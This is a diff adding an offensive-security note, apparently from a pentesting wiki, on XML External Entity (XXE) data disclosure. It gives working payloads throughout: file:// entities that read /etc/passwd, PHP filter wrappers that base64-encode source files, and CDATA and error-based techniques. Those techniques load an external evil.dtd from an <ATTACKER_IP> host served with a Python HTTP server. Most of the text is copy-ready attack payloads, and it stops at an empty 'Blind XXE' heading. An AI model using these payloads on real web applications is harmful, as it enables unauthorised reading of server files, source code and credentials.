@@ -1,0 +1,207 @@
+---
+Primary_category: "[[XXE]]"
+title: "XXE - DATA DISCLOSURE"
+draft: false
+banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
+banner_y: 0.88286
+tags:
+cssclasses:
+---
+
+###### PRIMARY CATEGORY → [[XXE]]
+
+Once we detect that a web application does not validate and sanitize the *XML* data that an *HTTP* client sends, we could try to define an *XML External Entity* in order to disclose local files on the web server
+
+#### *Simple XXE*
+
+> ***e.g. file://<FILE_PATH>***
+
+We must identify which data we send is reflected in the *HTTP* response. After that, it's as simple as defining an *External Entity* and referencing it in the given field where the data is reflected
+
+To do so, proceed as follows
+
+##### *Payload*
+
+```bash
+<?xml version="1.0" encoding="UTF-8"?>
+	<!DOCTYPE foo [
+		<!ENTITY bar SYSTEM "file:///etc/passwd">
+	]>
+...<SNIP>...
+	<email>
+		&bar;
+	</email>
+```
+
+---
+
+#### *PHP Filter Wrapper XXE*
+
+> ***For PHP web applications***
+
+There are situations where the output of the specified file we are trying to list may break the *XML* format
+
+So, it is mandatory to modify the data output stream to receive it in other encoding format, such as *base64*, *ROT13* or another
+
+For example, it applies to the *PHP* files, which may contain *XML* sensitive chars. Therefore, we can use the *PHP Filter Wrapper*
+
+##### *Payload*
+
+```bash
+<?xml version="1.0" encoding="UTF-8"?>
+	<!DOCTYPE foo [
+		<!ENTITY bar SYSTEM "php://filter/convert.base64-encode/resource=index.php">
+	]>
+...<SNIP>...
+	<email>
+		&bar;
+	</email>
+```
+
+---
+
+#### *CDATA XXE*
+
+> ***Any web application other than PHP***
+
+As with the previous technique, there are other ways to extract any kind of data, which may break the *XML* format, apart from *PHP Wrappers*, which is useful when the web application does not run *PHP*
+
+We can use the *CDATA* tag to wrapp the content of any external file reference
+
+```bash
+<![CDATA[<FILE_CONTENT>]]>
+```
+
+This way, the *XML* parser would consider this part as raw data, which can contain any type of data, including any special characters
+
+Therefore, we must define four *XML Parameter Entities* to build the above structure
+
+```bash
+<!DOCTYPE foo [
+	<!ENTITY % start "<![CDATA[">
+	<!ENTITY % file SYSTEM "file:///var/www/html/index.php">
+	<!ENTITY % end "]]>">
+	<!ENTITY % all "<!ENTITY content '%start;%file;%end;'">
+	%all;
+]>
+```
+
+And then, we reference the declared entity
+
+```bash
+<element>&content;</element>
+```
+
+The problem of this approach is that it will cause an error during the *XML* parsing as the *index.php* file likely contains special chars, and with internal definitions, as is the case, the *XML* parser processes and validates every line, so an error will occur when the *file* parameter entity is expanded since it contains special chars
+
+That's not the case when we create an external *DTD* with all the above parameter entity definitions and load it using another parameter entity
+
+The *XML* parser is more permissive as it processes all lines before proceed with the validation, so the *\%all;* entity can be load in memory without any error, as there is no validation at that moment, and be referenced later
+
+##### *Creating an external DTD*
+
+So, as stated, we must create an external *DTD* to avoid any errors during the *XML* parsing as the parser processes all the lines and then validates them
+
+> ***Unlike the internal definitions, where the parser processes and validates line by line***
+
+###### *#1*
+
+```bash title="evil.dtd"
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % file SYSTEM "file:///var/www/html/index.php">
+<!ENTITY % end "]]>">
+<!ENTITY % all "<!ENTITY content '%start;%file;%end;'>">
+```
+
+###### *#2*
+
+```bash title="evil.dtd"
+echo '<!ENTITY all "%start;%file;%end;">' > evil.dtd
+```
+
+##### *Setting up a HTTP Server*
+
+```bash
+python3 -m http.server 80
+```
+
+##### *Sending the XXE Payload*
+
+###### *#1*
+
+```bash
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+	<!ENTITY % dtd SYSTEM "http://<ATTACKER_IP>/evil.dtd">
+	%dtd;
+	%all;
+]>
+...<SNIP>...
+<element>&content;</element>
+```
+
+###### *#2*
+
+```bash
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE [
+	<!ENTITY % start "<![CDATA[">
+	<!ENTITY % file "file:///var/www/html/index.php">
+	<!ENTITY % end "]]>">
+	<!ENTITY % dtd SYSTEM "http://<ATTACKER_IP>/evil.dtd">
+	%dtd;
+]>
+...<SNIP>...
+<element>&all;</element>
+```
+
+This technique can become very handy when the basic *XXE* method does not work and the web application we are dealing with does not run *PHP*
+
+---
+
+#### *Error Based XXE*
+
+We will tipically be dealing with web applications that do not output any results once we send the *XML* data. So, we cannot control any data since no data is displayed in the response
+
+In these cases, we are blind to the *XML* output, therefore we cannot retrieve any data with the previous methods
+
+However, the web application may not have a proper exception handling for the *XML* input, so we can use this flaw to read the output of the *XXE* exploit
+
+To do so, proceed as follows
+
+##### *Creating an external DTD*
+
+Once again, we have to create an external *DTD* to prevent errors during the process-then-validation line by line carried out by the *XML* parser
+
+Remember that by creating an external *DTD* and referencing it from the sent payload, we ensure that the *XML*  parser first processes all the lines and then validates them
+
+```bash title="evil.dtd"
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
+```
+
+Doing so, first we define a parameter entity *( %file )* that stores the content of the given file, and then we define another parameter entity *( %error )*
+
+The latter tries to define a normal entity *( content )* by using *SYSTEM* and referencing a non-existing entity *( %nonExistingEntity )* and the parameter entity declared previously *( %file )*
+
+##### *Setting up an HTTP Server*
+
+```bash
+python3 -m http.server 80
+```
+
+##### *Sending the XXE Payload*
+
+Lastly, we send the following *XXE* payload, which loads the external *DTD* and references the given entities to generate the error and subsequently retrive the content of the given file
+
+```bash
+<!DOCTYPE foo [
+	<!ENTITY % dtd SYSTEM "http://<ATTACKER_IP>/evil.dtd">
+	%dtd;
+	%error;
+]>
+```
+
+---
+
+#### *Blind XXE*
